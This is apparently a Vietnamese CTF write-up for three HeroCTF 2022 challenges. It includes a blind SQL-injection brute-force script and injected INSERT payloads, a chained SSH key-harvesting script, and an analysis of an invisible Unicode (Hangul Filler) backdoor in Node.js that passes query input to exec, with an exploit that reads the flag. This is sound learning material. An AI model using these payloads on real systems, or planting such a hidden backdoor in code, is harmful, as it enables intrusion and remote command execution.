# HeroCTF 2022

## BlackCat

**Description**: Ayo nạp email và sau 3 ngày email mày sẽ được validate từ đó có thể tham gia cái event này vui lắm(flag).

Đây là 1 bài blackbox nên tối mờ tối mịt, khó là ở chỗ foothold, không có hint chắc người thiếu kiên nhẫn như mình đòi bỏ quộc.

1. Cho 1 endpoint curl đến với 1 email, trả về 1 endpoint khác cùng secret.
2. Curl đến endpoint trả về trên cùng email và secret thi được `ayo!! 3 ngày`

Làm gì đây, là 1 hacker thì phải đa nghi đi test tất chứ, thử SQLi vào email endpoint thứ nhất thì đúng là nó dính(trigger error bằng comment hoặc `e@b.c', 'secret')-- -` mà curl với secret trên đúng là chuẩn rồi)

Mình muốn nhấn mạnh mình cần đa nghi nhiều hơn nữa và test tất, đã thử là thử cho ra trò, xem xét req valid với res valid và error khi test các kí tự đặc biệt.

Tiếp build python script brute-force tìm table và column:
```python
import requests
import string

characters = string.ascii_letters + string.digits + string.punctuation
url = 'https://blackcat.web.heroctf.fr/api/newsletter.php'
s = requests.Session()


headers = {
    'User-Agent': 'curl/7.83.0',
    'Accept': '*/*',
    'Content-Type': 'application/x-www-form-urlencoded'
}

flag = ''
while True:
    for c in characters:
        data = {
            'email': f"hello16@abc.com', (SELECT CASE WHEN (SELECT ascii(substring((SELECT email FROM newsletter limit 0,1),{len(flag)+1},1)))={ord(c)} THEN '1' ELSE 1/0 END)) ON DUPLICATE KEY UPDATE secret=secret-- -"
            # 'email': "hello16@abc.com', 'a') ON DUPLICATE KEY UPDATE send_date=1-- -"
        }

        r = s.post(url, data=data, headers=headers)
        print(flag+c)
        if 'ok' in r.json():
            flag += c
            print('[FOUND] : '+flag)
            break
```
1. Tìm được database(): backcat
2. table_name: newsletter
3. columns: email, secret, send_date

Tiếp ta dùng burp đấm(vì nó chỉ cho dùng curl(thật ra thêm header `tao là curl` là được))

### ENDPOINT 1
`request`:
```
POST /api/newsletter.php HTTP/2
Host: blackcat.web.heroctf.fr
User-Agent: curl/7.83.0
Accept: */*
Content-Length: 84
Content-Type: application/x-www-form-urlencoded

email=devme1@abc.com', 'a') ON DUPLICATE KEY UPDATE send_date=DATE('2023-11-22')-- -
```
Ta SQLi ở insert, nếu email trùng thì duplicate update `send_date` cho quá hạn là được!!. À mà quên, ta leak được column vs table_name nhưng không đọc được value trong đó nên ta không đoán được type của send_date là gì. Học làm pentest mà còn hỏi, phải test chứ gì, `int` không được nghĩ đến hàm `date()` để parse date.

`response`:
```
HTTP/2 200 OK
Server: nginx/1.21.6
Date: Sun, 29 May 2022 16:08:55 GMT
Content-Type: application/json
Content-Length: 269
X-Powered-By: PHP/7.2.34

{"ok":"Check at /api/check.php with your email as get parameter and this secret: cc58d9ae093cbfb80ebc as get parameter too, to check if you've been accepted.<br>Example: https://blackcat.web.heroctf.fr/api/check.php?email=worty@blackcat.fr&secret=a32ecb08749ffeaf4e78"}
```

### ENDPOINT 2
Giai đoạn get flag thôi!!

`request`:
```
GET /api/check.php?email=devme1@abc.com&secret=a HTTP/2
Host: blackcat.web.heroctf.fr
User-Agent: curl/7.83.0
Accept: */*


```

`response`:
```
HTTP/2 200 OK
Server: nginx/1.21.6
Date: Sun, 29 May 2022 16:08:57 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 268
X-Powered-By: PHP/7.2.34
Vary: Accept-Encoding

We are glad that you participate at this very hidden conference !<br>Conferences will take place at 'blackcatjnhhyaiolppiqnbsvvxgcifuelkzpalsm.onion'<br>Be sure to proof that you receive this email with this sentence : Hero{y0u_b34t_bl4ckc4t_0rg4n1z3rs!!}<br>BlackCat.
```

**flag**: `Hero{y0u_b34t_bl4ckc4t_0rg4n1z3rs!!`


## SSHs

**Description**: Một bài programing, cho username và password để SSH vào challenge(bắt đầu với user1), sau khi login vào thì nó cho `private_key` của `user2`.

Hướng giải đơn giản thôi, tạo script ssh vào từng user cho đến user thứ 250 là nó chứa flag(trong description).

**Search keyword**: `python ssh socket` tìm được đoạn code rồi edit tí là được: https://0xbharath.github.io/python-network-programming/protocols/ssh/index.html

```python
#!/usr/bin/env python3
import paramiko, sys, getpass

hostname = "chall.heroctf.fr"
username = "user{}"
password = "password123"
port = 10172
key = ''


client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
client.connect(hostname, username=username.format(1), password=password, port=port)

stdin, stdout, stderr = client.exec_command('./getSSHKey')
stdin.close()   

out = stdout.readlines()
for line in out:
    key += line

with open('id_rsa', 'w') as f:
    f.write(key)

stdout.close()
stderr.close()
client.close()

for i in range(2, 249):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    client.connect(hostname, username=username.format(248), key_filename='./id_rsa', port=port)
    key = ''

    stdin, stdout, stderr = client.exec_command('cat *')
    stdin.close()   

    out = stdout.readlines()
    for line in out:
        key += line

    with open('id_rsa', 'w') as f:
        f.write(key)
    stdout.close()
    stderr.close()
    client.close()
    if i % 10 == 0:
        print(key)
        print()

print(key)
```
**flag**: `Hero{Th47_w3RE_4_l0t_Of_uS3rS} `

## wherebackdoor

**Description**: Quên rồi nhưng mà tựa là hacker đã hack vào hệ thống và để lại 1 backdoor, mày tim được cái backdoor này không??

Challenges cho source-code:
```js
// .............
app.get('/server_health', cors(corsOptions), async (req, res) => {
    var { timeout,ㅤ} = req.query;
    const checkCommands = [
        '/bin/bash /home/player/scripts/fileIntegrity.sh',
        '/bin/bash /home/player/scripts/isUp.sh localhost:80',
        '/bin/bash /home/player/scripts/isUp.sh localhost:3000',ㅤ
    ];
// ............
output = ""
        await Promise.all(checkCommands.map(async (cmd) => {
            try {
                r = await exec(cmd, { timeout: t });
                output += r.stdout.trim() || r.stderr.trim();
            } catch (err) {
                output += "";
            }
            output += "\n"
        }));
// ...........
```

**Tham khảo**: https://certitude.consulting/blog/en/invisible-backdoor/

=> Dùng "HANGUL FILLER" để dấu backdoor
```
const { timeout,\u3164} = req.query;
// .....

const checkCommands = [
        'ping -c 1 google.com',
        'curl -s http://example.com/',\u3164
    ];
```
Ở đây hacker dùng "HANGUL FILLER" để dấu backdoor, sau đó mỗi lần muốn RCE chỉ cần nạp command vào kí tự này hay tham số này, tham số này sẽ nằm ẩn trong mảng checkCommands mà dev không thể thấy đợi được nạp vào `exec()`


```python
import requests

url = 'https://apibackdoor.web.heroctf.fr'

r = requests.get(url+'/server_health?\u3164=cat ../flag.txt')

print(r.text)
```

**flag**: `Hero{1nv1s1b1e_b4ckd0or_w7f}`
